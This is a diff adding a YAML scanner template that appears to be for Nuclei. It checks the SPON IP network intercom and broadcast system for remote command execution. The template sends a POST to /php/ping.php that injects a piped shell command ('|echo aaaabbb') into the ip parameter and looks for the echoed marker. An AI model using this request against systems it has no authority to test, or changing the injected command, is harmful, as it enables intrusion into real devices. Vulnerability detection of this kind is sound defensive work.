@@ -1,0 +1,32 @@
+id: SPON-IP-rce
+info:
+  author: Str1am
+  name: "SPON IP \u7F51\u7EDC\u5BF9\u8BB2\u5E7F\u64AD\u7CFB\u7EDF rce"
+  reference: https://poc.shuziguanxing.com/?#/publicIssueInfo#issueId=4578
+  severity: high
+  tags: SPON,rce
+requests:
+- matchers:
+  - status:
+    - 200
+    type: status
+  - condition: and
+    part: body
+    type: word
+    words:
+    - aaaabbb
+  matchers-condition: and
+  raw:
+  - 'POST /php/ping.php HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Content-Type: application/x-www-form-urlencoded
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101
+    Firefox/92.0
+
+
+    jsondata[ip]=%7Cecho aaaabbb&jsondata[type]=0
+
+    '
